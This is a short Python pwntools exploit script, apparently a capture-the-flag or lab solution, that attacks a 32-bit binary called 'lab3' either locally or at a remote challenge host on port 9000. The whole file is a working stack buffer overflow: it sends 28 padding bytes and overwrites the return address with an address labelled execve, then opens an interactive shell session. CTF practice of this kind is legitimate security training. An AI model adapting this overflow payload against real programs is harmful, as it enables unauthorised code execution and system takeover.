#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 0
_local = 1

host = "beef.nisra.net"
port = "9000"

if _local:
	r = process('./lab3')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

execve = 0x8048561

payload = '\x00'*28
payload += p32(execve)

print r.recvuntil(')')
r.sendline(payload)
# print r.recv()
r.interactive()